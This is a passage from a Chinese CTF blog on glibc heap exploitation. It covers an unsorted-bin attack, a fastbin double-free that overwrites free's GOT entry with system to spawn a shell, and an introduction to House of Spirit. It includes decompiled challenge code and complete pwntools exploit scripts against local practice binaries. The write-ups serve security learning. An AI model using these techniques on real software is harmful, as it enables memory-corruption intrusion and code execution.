<h4 id="create-heap函数如下："><a href="#create-heap函数如下：" class="headerlink" title="create_heap函数如下："></a>create_heap函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__int64 create_heap()</span><br><span class="line">&#123;</span><br><span class="line">  signed int i; &#x2F;&#x2F; [sp+4h] [bp-1Ch]@1</span><br><span class="line">  size_t size; &#x2F;&#x2F; [sp+8h] [bp-18h]@3</span><br><span class="line">  char buf; &#x2F;&#x2F; [sp+10h] [bp-10h]@3</span><br><span class="line">  __int64 v4; &#x2F;&#x2F; [sp+18h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v4 &#x3D; *MK_FP(__FS__, 40LL);</span><br><span class="line">  for ( i &#x3D; 0; i &lt;&#x3D; 9; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( !*(&amp;heaparray + i) )</span><br><span class="line">    &#123;</span><br><span class="line">      printf(&quot;Size of Heap : &quot;);</span><br><span class="line">      read(0, &amp;buf, 8uLL);</span><br><span class="line">      size &#x3D; atoi(&amp;buf);</span><br><span class="line">      *(&amp;heaparray + i) &#x3D; malloc(size);</span><br><span class="line">      if ( !*(&amp;heaparray + i) )</span><br><span class="line">      &#123;</span><br><span class="line">        puts(&quot;Allocate Error&quot;);</span><br><span class="line">        exit(2);</span><br><span class="line">      &#125;</span><br><span class="line">      printf(&quot;Content of heap:&quot;, &amp;buf);</span><br><span class="line">      read_input(*(&amp;heaparray + i), size);</span><br><span class="line">      puts(&quot;SuccessFul&quot;);</span><br><span class="line">      return *MK_FP(__FS__, 40LL) ^ v4;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return *MK_FP(__FS__, 40LL) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="edit-heap函数如下"><a href="#edit-heap函数如下" class="headerlink" title="edit_heap函数如下"></a>edit_heap函数如下</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__int64 edit_heap()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; &#x2F;&#x2F; ST08_8@6</span><br><span class="line">  int v2; &#x2F;&#x2F; [sp+4h] [bp-1Ch]@1</span><br><span class="line">  char buf; &#x2F;&#x2F; [sp+10h] [bp-10h]@1</span><br><span class="line">  __int64 v4; &#x2F;&#x2F; [sp+18h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v4 &#x3D; *MK_FP(__FS__, 40LL);</span><br><span class="line">  printf(&quot;Index :&quot;);</span><br><span class="line">  read(0, &amp;buf, 4uLL);</span><br><span class="line">  v2 &#x3D; atoi(&amp;buf);</span><br><span class="line">  if ( v2 &lt; 0 || v2 &gt; 9 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Out of bound!&quot;);</span><br><span class="line">    _exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( *(&amp;heaparray + v2) )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Size of Heap : &quot;, &amp;buf);</span><br><span class="line">    read(0, &amp;buf, 8uLL);</span><br><span class="line">    v0 &#x3D; atoi(&amp;buf);</span><br><span class="line">    printf(&quot;Content of heap : &quot;, &amp;buf);</span><br><span class="line">    read_input(*(&amp;heaparray + v2), v0);</span><br><span class="line">    puts(&quot;Done !&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;No such heap !&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return *MK_FP(__FS__, 40LL) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="delete-heap函数如下："><a href="#delete-heap函数如下：" class="headerlink" title="delete_heap函数如下："></a>delete_heap函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__int64 delete_heap()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; &#x2F;&#x2F; [sp+Ch] [bp-14h]@1</span><br><span class="line">  char buf; &#x2F;&#x2F; [sp+10h] [bp-10h]@1</span><br><span class="line">  __int64 v3; &#x2F;&#x2F; [sp+18h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v3 &#x3D; *MK_FP(__FS__, 40LL);</span><br><span class="line">  printf(&quot;Index :&quot;);</span><br><span class="line">  read(0, &amp;buf, 4uLL);</span><br><span class="line">  v1 &#x3D; atoi(&amp;buf);</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt; 9 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Out of bound!&quot;);</span><br><span class="line">    _exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( *(&amp;heaparray + v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    free(*(&amp;heaparray + v1));</span><br><span class="line">    *(&amp;heaparray + v1) &#x3D; 0LL;</span><br><span class="line">    puts(&quot;Done !&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;No such heap !&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return *MK_FP(__FS__, 40LL) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="133t函数如下："><a href="#133t函数如下：" class="headerlink" title="133t函数如下："></a>133t函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int l33t()</span><br><span class="line">&#123;</span><br><span class="line">  return system(&quot;cat .&#x2F;flag&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们发现，当我们控制 v3 为 4869，同时控制 magic 大于 4869，就可以得到 flag 了。而在edit_heap（）函数中，程序根据我们输入的size进行存入数据，没有进行判断是否合法，这就造成了任意长度的堆溢出漏洞。</p>
<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>很明显这是个unsorted_bin_attack，首先我们创建一个大于144字节chunk，然后free掉，再通过修改和它相邻的chunk，进而修改该chunk的bk地址。</p>
<h4 id="exp如下："><a href="#exp如下：" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">r &#x3D; process(&#39;.&#x2F;magicheap&#39;)</span><br><span class="line"></span><br><span class="line">def create_heap(size, content):</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(&quot;1&quot;)</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line">def edit_heap(idx, size, content):</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(&quot;2&quot;)</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line">def del_heap(idx):</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(&quot;3&quot;)</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">create_heap(0x20, &quot;dada&quot;)  # 0</span><br><span class="line">create_heap(0x80, &quot;dada&quot;)  # 1</span><br><span class="line"># in order not to merge into top chunk</span><br><span class="line">create_heap(0x20, &quot;dada&quot;)  # 2</span><br><span class="line"></span><br><span class="line">del_heap(1)</span><br><span class="line"></span><br><span class="line">magic &#x3D; 0x6020c0</span><br><span class="line">fd &#x3D; 0</span><br><span class="line">bk &#x3D; magic - 0x10</span><br><span class="line"></span><br><span class="line">edit_heap(0, 0x20 + 0x20, &quot;a&quot; * 0x20 + p64(0) + p64(0x91) + p64(fd) + p64(bk))</span><br><span class="line">create_heap(0x80, &quot;dada&quot;)  #trigger unsorted bin attack</span><br><span class="line">r.recvuntil(&quot;:&quot;)</span><br><span class="line">r.sendline(&quot;4869&quot;)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>参考链接：<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/" target="_blank" rel="noopener external nofollow noreferrer">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/</a></p>
]]></content>
      <categories>
        <category>pwn</category>
        <category>heap</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
        <tag>Unsorted_Bin</tag>
      </tags>
  </entry>
  <entry>
    <title>Fastbin Attack</title>
    <url>/2020/05/18/fastbin-attack/</url>
    <content><![CDATA[<p><img src="https://i.loli.net/2020/09/29/ytANlTwxSo7mrpX.jpg" alt="alt"></p>
<a id="more"></a>

<h2 id="学习心得"><a href="#学习心得" class="headerlink" title="学习心得"></a>学习心得</h2><p>最近学习了关于fastbin_attack相关的利用方法，明白了关于fastbin原来有这么多利用方法，深刻体会到了自己是有多么的菜。下面就是关于我自己整理的一些利用漏洞的心得。</p>
<h2 id="介绍-CTF-WIKI"><a href="#介绍-CTF-WIKI" class="headerlink" title="介绍(CTF WIKI)"></a>介绍(CTF WIKI)</h2><p>fastbin attack 是一类漏洞的利用方法，是指所有基于 fastbin 机制的漏洞利用方法。这类利用的前提是：</p>
<ul>
<li>存在堆溢出、use-after-free 等能控制 chunk 内容的漏洞</li>
<li>漏洞发生于 fastbin 类型的 chunk 中</li>
</ul>
<p>如果细分的话，可以做如下的分类：</p>
<ul>
<li>Fastbin Double Free</li>
<li>House of Spirit</li>
<li>Alloc to Stack</li>
<li>Arbitrary Alloc</li>
</ul>
<p>其中，前两种主要漏洞侧重于利用 <code>free</code> 函数释放真的 chunk 或伪造的 chunk，然后再次申请 chunk 进行攻击，后两种侧重于故意修改 <code>fd</code> 指针，直接利用 <code>malloc</code> 申请指定位置 chunk 进行攻击。</p>
<h2 id="Fastbin-Double-Free"><a href="#Fastbin-Double-Free" class="headerlink" title="Fastbin Double Free"></a>Fastbin Double Free</h2><h3 id="利用原理："><a href="#利用原理：" class="headerlink" title="利用原理："></a>利用原理：</h3><ul>
<li>fastbin在free的时候不会检查链表后面的chunk</li>
<li>fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空</li>
</ul>
<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ul>
<li>free时候没有将free后的指针置空</li>
</ul>
<p>这里做一道例题来演示一下</p>
<h3 id="Roc826"><a href="#Roc826" class="headerlink" title="Roc826"></a>Roc826</h3><h4 id="checksec检查："><a href="#checksec检查：" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h4 id="main函数如下："><a href="#main函数如下：" class="headerlink" title="main函数如下："></a>main函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; &#x2F;&#x2F; eax@2</span><br><span class="line"></span><br><span class="line">  setbuf(stdin, 0LL);</span><br><span class="line">  setbuf(_bss_start, 0LL);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      while ( 1 )</span><br><span class="line">      &#123;</span><br><span class="line">        menu();</span><br><span class="line">        v3 &#x3D; readi();</span><br><span class="line">        if ( v3 !&#x3D; 2 )</span><br><span class="line">          break;</span><br><span class="line">        dele();</span><br><span class="line">      &#125;</span><br><span class="line">      if ( v3 &gt; 2 )</span><br><span class="line">        break;</span><br><span class="line">      if ( v3 !&#x3D; 1 )</span><br><span class="line">        goto LABEL_13;</span><br><span class="line">      add();</span><br><span class="line">    &#125;</span><br><span class="line">    if ( v3 !&#x3D; 3 )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v3 &#x3D;&#x3D; 4 )</span><br><span class="line">        exit(0);</span><br><span class="line">LABEL_13:</span><br><span class="line">      exit(0);</span><br><span class="line">    &#125;</span><br><span class="line">    show();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="add函数如下："><a href="#add函数如下：" class="headerlink" title="add函数如下："></a>add函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__int64 add()</span><br><span class="line">&#123;</span><br><span class="line">  signed int i; &#x2F;&#x2F; [sp+8h] [bp-8h]@1</span><br><span class="line">  int v2; &#x2F;&#x2F; [sp+Ch] [bp-4h]@3</span><br><span class="line"></span><br><span class="line">  for ( i &#x3D; 0; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( i &gt; 19 )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;full!&quot;);</span><br><span class="line">      return 0LL;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( !*(_QWORD *)&amp;list[8 * i] )</span><br><span class="line">      break;</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;size?&quot;);</span><br><span class="line">  v2 &#x3D; readi();</span><br><span class="line">  if ( v2 &lt; 0 || v2 &gt; 144 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Invalid size!&quot;);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  *(_QWORD *)&amp;list[8 * i] &#x3D; malloc(v2);</span><br><span class="line">  printf(&quot;content:&quot;);</span><br><span class="line">  read_n(*(_QWORD *)&amp;list[8 * i], (unsigned int)v2);</span><br><span class="line">  puts(&quot;done!&quot;);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="show函数如下："><a href="#show函数如下：" class="headerlink" title="show函数如下："></a>show函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__int64 show()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; &#x2F;&#x2F; [sp+Ch] [bp-4h]@1</span><br><span class="line"></span><br><span class="line">  puts(&quot;index?&quot;);</span><br><span class="line">  v1 &#x3D; readi();</span><br><span class="line">  if ( *(_QWORD *)&amp;list[8 * v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;content:&quot;);</span><br><span class="line">    puts(*(const char **)&amp;list[8 * v1]);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Invalid index!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="dele函数如下："><a href="#dele函数如下：" class="headerlink" title="dele函数如下："></a>dele函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__int64 dele()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; &#x2F;&#x2F; [sp+Ch] [bp-4h]@1</span><br><span class="line"></span><br><span class="line">  puts(&quot;index?&quot;);</span><br><span class="line">  v1 &#x3D; readi();</span><br><span class="line">  if ( *(_QWORD *)&amp;list[8 * v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    free(*(void **)&amp;list[8 * v1]);</span><br><span class="line">    puts(&quot;done!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Invalid index!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到在dele函数中存在很明显的漏洞，free后没有将指针置空，而且show函数中只会检查该chunk的指针是否置空。</p>
<h4 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h4><ol>
<li><p>申请unsorted bin大小的chunk，free掉后，fd和bk中会有<code>main_arena</code>地址，然后利用show函数泄露其中地址。</p>
</li>
<li><p>利用double free漏洞，在fastbin中造成类似于<code>chunk1--&gt;chunk2--&gt;chunk1</code>这样的链表，然后申请chunk1并且修改fd为free_got地址附近，这里要注意伪造size，这里我找的是0x601ffa这个地址。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;10gx 0x601ffa</span><br><span class="line">0x601ffa:	0x1e28000000000000	0xe168000000000060    &lt;----fake_size</span><br><span class="line">0x60200a:	0xeee000007ffff7ff	0x14f000007ffff7de     free_got地址是0x602018</span><br><span class="line">0x60201a:	0xe29000007ffff7a9	0xc69000007ffff7a7</span><br><span class="line">0x60202a:	0x06c600007ffff7a7	0x36b0000000000040</span><br><span class="line">0x60203a:	0x280000007ffff7a8	0x425000007ffff7a6</span><br></pre></td></tr></table></figure>
</li>
<li><p>然后连续malloc拿到这个地址，将free_got地址的内容修改为system地址，然后将之前输入带有<code>/bin/sh\x00</code>的chunk释放掉，就可以getshell了。这里也可以将chunk伪造到<code>malloc_hook</code>附近，将<code>one_gadget</code>写入<code>malloc_hook</code>。</p>
</li>
</ol>
<h4 id="exp如下："><a href="#exp如下：" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&#39;.&#x2F;Roc826&#39;)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;Roc826&#39;)</span><br><span class="line">libc&#x3D;elf.libc</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">def add(size,content) :</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(&#39;1&#39;)</span><br><span class="line">	sh.recvuntil(&#39;\n&#39;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(content)</span><br><span class="line"></span><br><span class="line">def show(index) :</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(&#39;3&#39;)</span><br><span class="line">        sh.recvuntil(&#39;?\n&#39;)</span><br><span class="line">        sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def free(index) :</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(&#39;2&#39;)</span><br><span class="line">        sh.recvuntil(&#39;\n&#39;)</span><br><span class="line">        sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">add(0x80,&#39;L0ne1y&#39;) #0</span><br><span class="line">add(0x50,&#39;L0ne1y&#39;) #1</span><br><span class="line">add(0x50,&#39;L0ne1y&#39;) #2</span><br><span class="line">add(0x50,&#39;&#x2F;bin&#x2F;sh\x00&#39;) #3</span><br><span class="line">free(0)</span><br><span class="line">show(0)</span><br><span class="line">sh.recvuntil(&#39;content:&#39;)</span><br><span class="line">main_arena&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">print(&#39;main_arena:&#39; +hex(main_arena))</span><br><span class="line">libc_base&#x3D;main_arena-libc.symbols[&#39;__malloc_hook&#39;]-0x68</span><br><span class="line">print(&#39;libc_base:&#39; +hex(libc_base))</span><br><span class="line">system_addr&#x3D;libc_base+libc.symbols[&#39;system&#39;]</span><br><span class="line">print (&#39;system_addr:&#39; +hex(system_addr))</span><br><span class="line"></span><br><span class="line">free(1)</span><br><span class="line">free(2)</span><br><span class="line">free(1)  # 1-&gt;2&lt;-&gt;1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x50,p64(0x601ffa))</span><br><span class="line"></span><br><span class="line">add(0x50,&#39;L0ne1y&#39;)</span><br><span class="line">add(0x50,&#39;L0ne1y&#39;)</span><br><span class="line">add(0x50,&#39;a&#39;*14+p64(system_addr)[:6])</span><br><span class="line"></span><br><span class="line">free(3)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="House-of-Spirit"><a href="#House-of-Spirit" class="headerlink" title="House of Spirit"></a>House of Spirit</h2><h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>House of Spirit 是 <code>the Malloc Maleficarum</code> 中的一种技术。</p>
<p>该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配<strong>指定地址</strong>的 chunk 的目的。</p>
<p>要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，这里我们看一下它的源码。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void</span><br><span class="line">  public_fREe(Void_t* mem)</span><br><span class="line">  &#123;</span><br><span class="line">    mstate ar_ptr;</span><br><span class="line">    mchunkptr p;                          &#x2F;* chunk corresponding to mem *&#x2F;</span><br><span class="line">   </span><br><span class="line">    [...]</span><br><span class="line">   </span><br><span class="line">    p &#x3D; mem2chunk(mem);</span><br><span class="line">  </span><br><span class="line"> #if HAVE_MMAP</span><br><span class="line">   if (chunk_is_mmapped(p))                       &#x2F;*首先M标志位不能被置上才能绕过。release mmapped memory. *&#x2F;</span><br><span class="line">   &#123;</span><br><span class="line">     munmap_chunk(p);</span><br><span class="line">     return;</span><br><span class="line">   &#125;</span><br><span class="line"> #endif</span><br><span class="line">  </span><br><span class="line">   ar_ptr &#x3D; arena_for_chunk(p);</span><br><span class="line">  </span><br><span class="line">   [...]</span><br><span class="line">  </span><br><span class="line">   _int_free(ar_ptr, mem);</span><br></pre></td></tr></table></figure>

<p>首先mmap标志位不能被置上，否则会直接调用munmap_chunk函数去释放堆块。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> void</span><br><span class="line"> _int_free(mstate av, Void_t* mem)</span><br><span class="line"> &#123;</span><br><span class="line">   mchunkptr       p;           &#x2F;* chunk corresponding to mem *&#x2F;</span><br><span class="line">   INTERNAL_SIZE_T size;        &#x2F;* its size *&#x2F;</span><br><span class="line">   mfastbinptr*    fb;          &#x2F;* associated fastbin *&#x2F;</span><br><span class="line">  </span><br><span class="line">   [...]</span><br><span class="line">  </span><br><span class="line">  p &#x3D; mem2chunk(mem);</span><br><span class="line">  size &#x3D; chunksize(p);</span><br><span class="line"> </span><br><span class="line">  [...]</span><br><span class="line"> </span><br><span class="line">  &#x2F;*</span><br><span class="line">    If eligible, place chunk on a fastbin so it can be found</span><br><span class="line">    and used quickly in malloc.</span><br><span class="line">  *&#x2F;</span><br><span class="line"> </span><br><span class="line">  if ((unsigned long)(size) &lt;&#x3D; (unsigned long)(av-&gt;max_fast)   &#x2F;*其次，size的大小不能超过fastbin的最大值*&#x2F;</span><br><span class="line"> </span><br><span class="line">#if TRIM_FASTBINS</span><br><span class="line">      &#x2F;*</span><br><span class="line">       If TRIM_FASTBINS set, don&#39;t place chunks</span><br><span class="line">       bordering top into fastbins</span><br><span class="line">      *&#x2F;</span><br><span class="line">      &amp;&amp; (chunk_at_offset(p, size) !&#x3D; av-&gt;top)</span><br><span class="line">#endif</span><br><span class="line">      ) &#123;</span><br><span class="line"> </span><br><span class="line">    if (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;&#x3D; 2 * SIZE_SZ, 0)</span><br><span class="line">       || __builtin_expect (chunksize (chunk_at_offset (p, size))</span><br><span class="line">                         &gt;&#x3D; av-&gt;system_mem, 0))                        &#x2F;*最后是下一个堆块的大小，要大于2*SIZE_ZE小于system_mem*&#x2F;</span><br><span class="line">      &#123;</span><br><span class="line">       errstr &#x3D; &quot;free(): invalid next size (fast)&quot;;</span><br><span class="line">       goto errout;</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">    [...]</span><br><span class="line">    fb &#x3D; &amp;(av-&gt;fastbins[fastbin_index(size)]);</span><br><span class="line">    [...]</span><br><span class="line">    p-&gt;fd &#x3D; *fb;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>其次是伪造堆块的size字段不能超过fastbin的最大值，超过的话，就不会释放到fastbin里面了。</p>
<p>最后是下一个堆块的大小，要大于2*SIZE_ZE小于system_mem,否则会报invalid next size的错误。</p>
<p>这里总结一下利用House Of Spirirt需要的条件</p>
<ul>
<li>fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。</li>
<li>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK</li>
<li>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。</li>
<li>fake chunk 的 next chunk 的大小不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code> 。</li>
<li>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。</li>
</ul>
<p>我们画个图来理解一下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-----------------</span><br><span class="line">| 可控区域1      |</span><br><span class="line">-----------------</span><br><span class="line">| 目标区域       |     一般是函数指针，或者是返回地址</span><br><span class="line">-----------------</span><br><span class="line">| 可控区域2      |</span><br><span class="line">-----------------</span><br></pre></td></tr></table></figure>

<p>1、这里我们需要在可控区域1中伪造一个fake_chunk，这个fake_chunk的ISMMAP 位不能为 1，地址需要对齐，size需要是fastbin chunk的大小，也需要对齐地址。而且fake_chunk需要将目标区域包括进去。</p>
<p>2、在可控区域2这里需要有fake_chunk的next_size，next chunk 的大小不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem(128kb)</code>，需要注意的是fake_chunk和next_chunk在物理上是相邻的。</p>
<h3 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h3><ul>
<li>可以泄露栈上地址</li>
<li>可以覆盖堆指针</li>
<li>想要控制的目标区域的前段空间与后段空间都是可控的内存区域</li>
</ul>
<h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><ol>
<li>在可控区域1伪造chunk，目的是为了可以控制目标区域</li>
<li>修改堆指针指向fake_chunk</li>
<li>free掉堆指针</li>
<li>malloc回来刚才free掉的chunk，最终使得可以往目标区域中写入数据，实现目的。</li>
</ol>
<p>这里我们以一道例题来举例。</p>
<h3 id="l-ctf-pwn200"><a href="#l-ctf-pwn200" class="headerlink" title="l_ctf_pwn200"></a>l_ctf_pwn200</h3><h4 id="checksec检查：-1"><a href="#checksec检查：-1" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>

<h4 id="main函数如下：-1"><a href="#main函数如下：-1" class="headerlink" title="main函数如下："></a>main函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  sub_40079D();</span><br><span class="line">  sub_400A8E();</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="sub-400A8E函数如下："><a href="#sub-400A8E函数如下：" class="headerlink" title="sub_400A8E函数如下："></a>sub_400A8E函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int sub_400A8E()</span><br><span class="line">&#123;</span><br><span class="line">  signed __int64 i; &#x2F;&#x2F; [sp+10h] [bp-40h]@1</span><br><span class="line">  char v2[48]; &#x2F;&#x2F; [sp+20h] [bp-30h]@2</span><br><span class="line"></span><br><span class="line">  puts(&quot;who are u?&quot;);</span><br><span class="line">  for ( i &#x3D; 0LL; i &lt;&#x3D; 47; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    read(0, &amp;v2[i], 1uLL);</span><br><span class="line">    if ( v2[i] &#x3D;&#x3D; 10 )</span><br><span class="line">    &#123;</span><br><span class="line">      v2[i] &#x3D; 0;</span><br><span class="line">      break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  printf(&quot;%s, welcome to xdctf~\n&quot;, v2);</span><br><span class="line">  puts(&quot;give me your id ~~?&quot;);</span><br><span class="line">  sub_4007DF();</span><br><span class="line">  return sub_400A29();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序在<code>int sub_400A8E()</code>存在一个off by one的漏洞，当输入48个字符的时候，会连带着将RBP里的值打印出来。这是因为read函数读取字符串的时候不会在末尾加上<code>\x00</code>。这就满足HOS利用条件之一<code>泄露栈地址</code>。</p>
